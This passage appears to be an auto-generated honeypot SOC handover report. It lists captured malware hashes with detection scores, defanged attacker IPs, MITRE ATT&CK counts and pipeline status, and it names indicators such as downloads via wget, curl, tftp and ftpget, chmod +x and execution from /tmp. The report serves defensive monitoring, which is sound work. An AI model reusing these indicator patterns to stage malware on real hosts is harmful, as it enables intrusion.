| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `85.158.145[.]129` | NL | cukman-kresimir | **100** ⚠️ | 0 |
| `172.239.64[.]84` | US | Linode | **100** ⚠️ | 50 |
| `182.75.197[.]174` | IN | Devbhumi Broadcast Pvt Ltd | **100** ⚠️ | 50 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `196.219.75[.]143` | EG | TE Data | **100** ⚠️ | 6 |
| `136.119.118[.]84` | US | Google LLC | **100** ⚠️ | 3 |
| `103.121.27[.]218` | IN | HiPOINT Connect Private Limited | **100** ⚠️ | 9 |
| `120.198.138[.]185` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `211.228.114[.]53` | KR | Korea Telecom | **100** ⚠️ | 37 |
| `190.55.123[.]227` | AR | Telecentro S.A. - Clientes Residenciales | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 84 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 9 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 7 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 5 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 446 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 29 recon entry/entries in table (8 group(s) consolidating 331 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-19T22:27:56Z_
